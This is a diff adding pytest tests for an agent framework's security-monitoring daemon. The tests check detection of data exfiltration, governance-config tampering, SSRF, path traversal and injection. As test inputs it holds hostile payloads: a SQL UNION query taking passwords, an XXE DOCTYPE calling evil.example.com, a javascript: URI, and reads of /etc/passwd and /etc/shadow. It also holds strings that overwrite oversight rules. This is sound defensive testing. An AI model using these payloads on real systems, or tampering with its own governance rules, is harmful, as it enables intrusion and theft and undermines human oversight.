@@ -17,7 +17,6 @@ from agents.core.daemons.sentinel import (
     SentinelDaemon,
 )
 
-
 # ─── Fixtures ────────────────────────────────────────────────────────────────
 
 
@@ -303,3 +302,230 @@ class TestEventBusIntegration:
 
         daemon.check({"type": "safe_event"})
         assert len(received) == 0
+
+
+# ─── High Severity Tests ────────────────────────────────────────────────────
+
+
+class TestHighSeverity:
+    """Tests for the HIGH severity level."""
+
+    def test_high_severity_exists(self):
+        assert AlertSeverity.HIGH.value == "high"
+
+    def test_high_severity_filter(self, running_daemon):
+        """Data exfiltration alert (HIGH) is filterable by severity."""
+        running_daemon.check({"payload": "private_key: AAABBBCCC"})
+        high_alerts = running_daemon.get_alerts(severity=AlertSeverity.HIGH)
+        # At least one HIGH alert should be present
+        assert len(high_alerts) >= 1
+
+    def test_high_stats_tracked(self, running_daemon):
+        """get_stats() reports high_alerts count."""
+        running_daemon.check({"payload": "private_key: AAABBBCCC"})
+        stats = running_daemon.get_stats()
+        assert "high_alerts" in stats
+        assert stats["high_alerts"] >= 1
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon(gas_spike_threshold=3.0)
+        d.start()
+        return d
+
+
+# ─── Data Exfiltration Tests ─────────────────────────────────────────────────
+
+
+class TestDataExfiltration:
+    """Tests for data exfiltration pattern detection."""
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon()
+        d.start()
+        return d
+
+    def test_large_base64_triggers_alert(self, running_daemon):
+        big_b64 = "A" * 100  # 100 chars — over the 80-char threshold
+        alerts = running_daemon.check({"payload": big_b64})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert len(exfil_alerts) == 1
+        assert exfil_alerts[0].severity == AlertSeverity.HIGH
+
+    def test_embedded_private_key_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "private_key: mysecretvalue1234"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert len(exfil_alerts) >= 1
+
+    def test_ssn_pattern_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert len(exfil_alerts) == 1
+
+    def test_credit_card_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "card 4111 1111 1111 1111"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert len(exfil_alerts) == 1
+
+    def test_safe_payload_no_exfil_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "normal operation log entry"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert len(exfil_alerts) == 0
+
+    def test_exfil_evidence_contains_match(self, running_daemon):
+        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert "matched" in exfil_alerts[0].evidence
+
+    def test_exfil_has_recommendation(self, running_daemon):
+        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
+        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
+        assert exfil_alerts[0].recommendation != ""
+
+
+# ─── Config Tampering Tests ──────────────────────────────────────────────────
+
+
+class TestConfigTampering:
+    """Tests for governance config tampering detection."""
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon()
+        d.start()
+        return d
+
+    def test_align_ledger_reference_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "open('governance/ALIGN_LEDGER.yaml', 'w')"})
+        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
+        assert len(tamper_alerts) >= 1
+        assert tamper_alerts[0].severity == AlertSeverity.CRITICAL
+
+    def test_sentinel_gate_reference_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "edit sentinel_gate.py and disable rules"})
+        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
+        assert len(tamper_alerts) >= 1
+
+    def test_compiled_rules_overwrite_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "_compiled_rules = []"})
+        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
+        assert len(tamper_alerts) >= 1
+
+    def test_safe_payload_no_tamper_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "query the database for results"})
+        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
+        assert len(tamper_alerts) == 0
+
+    def test_tamper_alert_has_recommendation(self, running_daemon):
+        alerts = running_daemon.check({"payload": "_load_ledger()"})
+        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
+        assert len(tamper_alerts) >= 1
+        assert "human approval" in tamper_alerts[0].recommendation.lower()
+
+
+# ─── SSRF / Path Traversal Tests ─────────────────────────────────────────────
+
+
+class TestSSRFAndPathTraversal:
+    """Tests for SSRF and path traversal detection."""
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon()
+        d.start()
+        return d
+
+    def test_localhost_ssrf_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "http://localhost:8080/admin"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 1
+        assert ssrf_alerts[0].severity == AlertSeverity.HIGH
+
+    def test_internal_ip_ssrf_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "http://192.168.1.1/secret"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 1
+
+    def test_file_uri_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "file:///etc/passwd"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 1
+
+    def test_path_traversal_triggers_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "../../etc/shadow"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 1
+
+    def test_safe_external_url_no_alert(self, running_daemon):
+        alerts = running_daemon.check({"payload": "https://api.example.com/data"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 0
+
+    def test_ssrf_evidence_contains_match(self, running_daemon):
+        alerts = running_daemon.check({"payload": "http://127.0.0.1/internal"})
+        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
+        assert len(ssrf_alerts) == 1
+        assert "matched" in ssrf_alerts[0].evidence
+
+
+# ─── ClearAlerts Tests ───────────────────────────────────────────────────────
+
+
+class TestClearAlerts:
+    """Tests for the clear_alerts() utility."""
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon()
+        d.start()
+        return d
+
+    def test_clear_alerts_returns_count(self, running_daemon):
+        running_daemon.check({"payload": 'eval("x")'})
+        running_daemon.check({"tier": "hearth", "required_tier": "sovereign"})
+        count = running_daemon.clear_alerts()
+        assert count == 2
+
+    def test_clear_alerts_empties_list(self, running_daemon):
+        running_daemon.check({"payload": 'eval("x")'})
+        running_daemon.clear_alerts()
+        assert running_daemon.get_alerts() == []
+
+    def test_clear_alerts_on_empty_returns_zero(self, running_daemon):
+        assert running_daemon.clear_alerts() == 0
+
+    def test_check_count_preserved_after_clear(self, running_daemon):
+        running_daemon.check({"type": "a"})
+        running_daemon.check({"type": "b"})
+        running_daemon.clear_alerts()
+        assert running_daemon.get_stats()["check_count"] == 2
+
+
+# ─── Extended Injection Tests ────────────────────────────────────────────────
+
+
+class TestExtendedInjectionPatterns:
+    """Tests for new injection patterns added to the sentinel daemon."""
+
+    @pytest.fixture
+    def running_daemon(self):
+        d = SentinelDaemon()
+        d.start()
+        return d
+
+    def test_xxe_injection_detected(self, running_daemon):
+        # Use ENTITY-style XXE without file:// to isolate injection detection
+        alerts = running_daemon.check({"payload": '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.example.com/xxe.dtd">'})
+        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
+        assert len(injection_alerts) >= 1
+
+    def test_sql_union_injection_detected(self, running_daemon):
+        alerts = running_daemon.check({"payload": "' UNION SELECT username, password FROM users--"})
+        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
+        assert len(injection_alerts) == 1
+
+    def test_javascript_protocol_injection_detected(self, running_daemon):
+        alerts = running_daemon.check({"payload": "javascript: alert(1)"})
+        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
+        assert len(injection_alerts) == 1
